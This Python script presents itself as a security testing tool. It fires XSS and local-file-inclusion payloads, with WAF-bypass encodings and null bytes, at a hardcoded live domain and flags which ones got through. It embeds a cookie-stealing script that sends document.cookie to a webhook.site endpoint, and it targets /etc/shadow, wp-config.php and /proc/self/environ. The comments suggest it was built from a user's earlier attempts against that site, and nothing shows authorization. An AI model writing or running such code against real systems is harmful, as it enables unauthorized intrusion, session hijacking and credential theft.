#!/usr/bin/env python3
"""
Payload Analyzer and Testing Tool
Analyzes and tests various payloads for web application security testing
"""

import requests
import urllib.parse
import base64
import html
import json
import time
from typing import List, Dict, Any
import re

class PayloadAnalyzer:
    def __init__(self, target_url: str, timeout: int = 10):
        self.target_url = target_url
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
    def decode_payload(self, encoded_payload: str) -> str:
        """Decode URL-encoded payload"""
        try:
            return urllib.parse.unquote(encoded_payload)
        except Exception as e:
            print(f"Error decoding payload: {e}")
            return encoded_payload
    
    def analyze_xss_payload(self, payload: str) -> Dict[str, Any]:
        """Analyze XSS payload components"""
        decoded = self.decode_payload(payload)
        
        analysis = {
            'original': payload,
            'decoded': decoded,
            'type': 'XSS',
            'components': []
        }
        
        # Extract JavaScript components
        if '<script>' in decoded.lower():
            analysis['components'].append('Script tag injection')
        
        if 'string.fromcharcode' in decoded.lower():
            # Extract character codes
            char_codes = re.findall(r'String\.fromCharCode\(([\d,\s]+)\)', decoded, re.IGNORECASE)
            for codes in char_codes:
                chars = [chr(int(code.strip())) for code in codes.split(',')]
                decoded_string = ''.join(chars)
                analysis['components'].append(f'Encoded string: {decoded_string}')
        
        if 'webhook.site' in decoded.lower():
            webhook_match = re.search(r'https://webhook\.site/([a-f0-9-]+)', decoded, re.IGNORECASE)
            if webhook_match:
                analysis['components'].append(f'Webhook endpoint: {webhook_match.group(0)}')
        
        if 'document.cookie' in decoded.lower():
            analysis['components'].append('Cookie theft attempt')
        
        if 'document.location' in decoded.lower():
            analysis['components'].append('Location redirect')
            
        return analysis
    
    def generate_lfi_payloads(self) -> List[str]:
        """Generate Local File Inclusion payloads"""
        payloads = []
        
        # Basic LFI payloads
        basic_lfi = [
            "../../../../../../etc/passwd",
            "../../../../../../wp-config.php",
            "../../../../../../var/log/apache2/access.log",
            "../../../../../../proc/self/environ",
            "../../../../../../etc/hosts",
            "../../../../../../etc/shadow"
        ]
        
        # URL encoding variations
        for payload in basic_lfi:
            payloads.append(payload)  # Normal
            payloads.append(urllib.parse.quote(payload))  # Single encoding
            payloads.append(urllib.parse.quote(urllib.parse.quote(payload)))  # Double encoding
            
            # Dot encoding variations
            dot_encoded = payload.replace('../', '%2e%2e%2f')
            payloads.append(dot_encoded)
            
            # Mixed encoding
            mixed = payload.replace('../', '%2e%2e/')
            payloads.append(mixed)
            
        return payloads
    
    def generate_bypass_payloads(self, base_payload: str) -> List[str]:
        """Generate various bypass techniques for payloads"""
        payloads = []
        
        # Original payload
        payloads.append(base_payload)
        
        # URL encoding variations
        payloads.append(urllib.parse.quote(base_payload))
        payloads.append(urllib.parse.quote(urllib.parse.quote(base_payload)))
        
        # HTML encoding
        payloads.append(html.escape(base_payload))
        
        # Base64 encoding
        try:
            b64_payload = base64.b64encode(base_payload.encode()).decode()
            payloads.append(b64_payload)
        except:
            pass
        
        # Case variations
        payloads.append(base_payload.upper())
        payloads.append(base_payload.lower())
        
        # Null byte injection
        payloads.append(base_payload + '%00')
        payloads.append(base_payload + '\x00')
        
        return payloads
    
    def test_payload(self, endpoint: str, param: str, payload: str) -> Dict[str, Any]:
        """Test a single payload against the target"""
        url = f"{self.target_url}/{endpoint}"
        params = {param: payload}
        
        result = {
            'url': url,
            'payload': payload,
            'param': param,
            'status_code': None,
            'response_length': 0,
            'blocked': False,
            'error': None,
            'response_preview': ''
        }
        
        try:
            response = self.session.get(url, params=params, timeout=self.timeout)
            result['status_code'] = response.status_code
            result['response_length'] = len(response.text)
            result['response_preview'] = response.text[:200] + '...' if len(response.text) > 200 else response.text
            
            # Check for common blocking patterns
            blocking_indicators = [
                'cloudflare',
                'blocked',
                'forbidden',
                '403',
                'access denied',
                'security',
                'firewall'
            ]
            
            response_lower = response.text.lower()
            for indicator in blocking_indicators:
                if indicator in response_lower:
                    result['blocked'] = True
                    break
                    
        except requests.exceptions.RequestException as e:
            result['error'] = str(e)
            
        return result
    
    def run_comprehensive_test(self) -> Dict[str, List[Dict[str, Any]]]:
        """Run comprehensive payload testing"""
        results = {
            'xss_tests': [],
            'lfi_tests': [],
            'bypass_tests': []
        }
        
        print("Starting comprehensive payload testing...")
        
        # Test XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//"
        ]
        
        print("\n=== Testing XSS Payloads ===")
        for payload in xss_payloads:
            bypass_variants = self.generate_bypass_payloads(payload)
            for variant in bypass_variants[:5]:  # Limit to first 5 variants
                result = self.test_payload('search', 'q', variant)
                results['xss_tests'].append(result)
                print(f"XSS Test - Status: {result['status_code']}, Blocked: {result['blocked']}, Payload: {variant[:50]}...")
                time.sleep(1)  # Rate limiting
        
        # Test LFI payloads
        print("\n=== Testing LFI Payloads ===")
        lfi_payloads = self.generate_lfi_payloads()
        for payload in lfi_payloads[:20]:  # Limit to first 20
            result = self.test_payload('index.php', 'page', payload)
            results['lfi_tests'].append(result)
            print(f"LFI Test - Status: {result['status_code']}, Blocked: {result['blocked']}, Payload: {payload[:50]}...")
            time.sleep(1)  # Rate limiting
        
        return results
    
    def analyze_original_payloads(self) -> None:
        """Analyze the original payloads from the user's attempts"""
        print("=== Analyzing Original Payloads ===\n")
        
        # Original XSS payload
        xss_payload = "%3Cscript%3Evar%20c%3DString.fromCharCode(99,111,111,107,105,101);var%20d%3DString.fromCharCode(100,111,99,117,109,101,110,116);var%20l%3DString.fromCharCode(108,111,99,97,116,105,111,110);var%20a%3D'https%3A%2F%2Fwebhook.site%2F128fa6c2-fe85-4a6c-b522-0346f6aae885'%3Bwindow%5Bd%5D%5Bl%5D%20%3D%20a%20%2B%20'/?c%3D'%20%2B%20encodeURIComponent(window%5Bd%5D%5Bc%5D)%3B%3C%2Fscript%3E"
        
        analysis = self.analyze_xss_payload(xss_payload)
        print("XSS Payload Analysis:")
        print(f"Original: {analysis['original']}")
        print(f"Decoded: {analysis['decoded']}")
        print("Components found:")
        for component in analysis['components']:
            print(f"  - {component}")
        
        print("\n" + "="*50 + "\n")
        
        # LFI payload attempts
        lfi_attempts = [
            "../../../../../../wp-config.php",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwp-config.php",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwp-config.php"
        ]
        
        print("LFI Payload Analysis:")
        for i, payload in enumerate(lfi_attempts, 1):
            decoded = self.decode_payload(payload)
            print(f"{i}. Original: {payload}")
            print(f"   Decoded: {decoded}")
            print(f"   Encoding: {'Double URL encoding' if '%25' in payload else 'Single URL encoding' if '%' in payload else 'No encoding'}")
        
    def generate_report(self, results: Dict[str, List[Dict[str, Any]]]) -> None:
        """Generate a comprehensive test report"""
        print("\n" + "="*60)
        print("COMPREHENSIVE PAYLOAD TEST REPORT")
        print("="*60)
        
        total_tests = sum(len(tests) for tests in results.values())
        blocked_tests = sum(sum(1 for test in tests if test['blocked']) for tests in results.values())
        successful_tests = sum(sum(1 for test in tests if test['status_code'] == 200 and not test['blocked']) for tests in results.values())
        
        print(f"\nSUMMARY:")
        print(f"Total tests conducted: {total_tests}")
        print(f"Tests blocked by security: {blocked_tests}")
        print(f"Potentially successful tests: {successful_tests}")
        print(f"Block rate: {(blocked_tests/total_tests)*100:.1f}%")
        
        # Detailed results for each category
        for category, tests in results.items():
            print(f"\n{category.upper().replace('_', ' ')} RESULTS:")
            print("-" * 30)
            
            success_count = sum(1 for test in tests if test['status_code'] == 200 and not test['blocked'])
            if success_count > 0:
                print(f"Potentially successful payloads found: {success_count}")
                for test in tests:
                    if test['status_code'] == 200 and not test['blocked']:
                        print(f"  ✓ Payload: {test['payload'][:100]}...")
                        print(f"    Response length: {test['response_length']}")
            else:
                print("No successful payloads found in this category")

def main():
    target_url = "https://pakyok77.link"
    
    analyzer = PayloadAnalyzer(target_url)
    
    # Analyze original payloads
    analyzer.analyze_original_payloads()
    
    # Run comprehensive testing
    results = analyzer.run_comprehensive_test()
    
    # Generate report
    analyzer.generate_report(results)
    
    # Save results to file
    with open('payload_test_results.json', 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"\nDetailed results saved to: payload_test_results.json")

if __name__ == "__main__":
    main()